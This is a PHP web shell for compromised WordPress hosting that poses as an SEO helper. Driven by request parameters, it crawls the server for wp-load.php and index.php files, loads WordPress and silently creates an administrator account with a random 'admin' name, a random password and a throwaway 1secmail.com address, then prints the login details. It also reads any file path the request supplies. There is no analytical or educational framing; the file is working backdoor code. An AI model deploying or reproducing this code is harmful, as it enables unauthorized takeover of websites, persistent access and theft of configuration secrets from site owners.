<?php
function find_wp_config_files($directory, &$wp_config_files) {
    if (!is_dir($directory) || !is_readable($directory)) {
        return;
    }
    $files = scandir($directory);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }

        $path = $directory . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            find_wp_config_files($path, $wp_config_files);
        }
        elseif ($file === 'wp-load.php') {
            $wp_config_files[] = $path;
        }
    }
}
function find_index_files($directory, &$wp_config_files) {
    if (!is_dir($directory) || !is_readable($directory)) {
        return;
    }

    $files = scandir($directory);
    $hasIndex = false; 

    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }

        $path = $directory . DIRECTORY_SEPARATOR . $file;

        if ($file === 'index.php') {
            $wp_config_files[] = $path;
            $hasIndex = true;
            break; 
        }
    }
    if (!$hasIndex) {
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') {
                continue;
            }

            $path = $directory . DIRECTORY_SEPARATOR . $file;
            if (is_dir($path)) {
                find_index_files($path, $wp_config_files);
            }
        }
    }
}

function dires() {
    echo "<div class='server'>".$_SERVER['SCRIPT_FILENAME']."</div>"."\n";
    die;
} 
function seo_index() {
    set_time_limit(0);
    error_reporting(0);

    $directory = $_REQUEST['load'];
    
    if ($directory) {
    $wp_config_files = [];
    $finder = $_REQUEST['finder'];
    if ($finder == 'wp') {
    find_wp_config_files($directory, $wp_config_files);
    }
    elseif ($finder == 'index'){
        find_index_files($directory, $wp_config_files);
    }
    echo '!';
    foreach ($wp_config_files as $file) {
        echo $file . PHP_EOL . "<br>";
    }
    }
    }
function loaduser($file_path) {

    if (!file_exists($file_path)) {
        die("wp-load.php not found at {$file_path}");
    }
    require($file_path);
    if (isset($_REQUEST['actions']) && $_REQUEST['actions'] === 'create_user') {
        $random_password = wp_generate_password(12, true, true);
        $random_user = 'admin' . bin2hex(random_bytes(1));
        $random_email = $random_user . '@1secmail.com';
        $userdata = array(
            'user_login' => $random_user,
            'user_pass'  => $random_password,
            'user_email' => $random_email,
            'role'       => 'administrator'
        );
        $user_id = wp_insert_user($userdata);
        if (is_wp_error($user_id)) {
            die("Error creating user: " . $user_id->get_error_message());
        }
        echo site_url(). " ".$random_user."|".$random_password;
    }
}


function read_file_content($filePath) {
    if (!file_exists($filePath)) {
        return "File does not exist: $filePath";
    }
    if (!is_readable($filePath)) {
        return "File is not readable: $filePath";
    }
    $content = file_get_contents($filePath);
    if ($content === false) {
        return "Error reading the file: $filePath";
    }

    return $content;
}

function read_file(){
    $filePath = $_REQUEST['rfile'];
    $fileContent = read_file_content($filePath);
    
    if (strpos($fileContent, 'Error') === 0) {
        echo $fileContent;
    } else {
        echo "\n$fileContent";
    }
}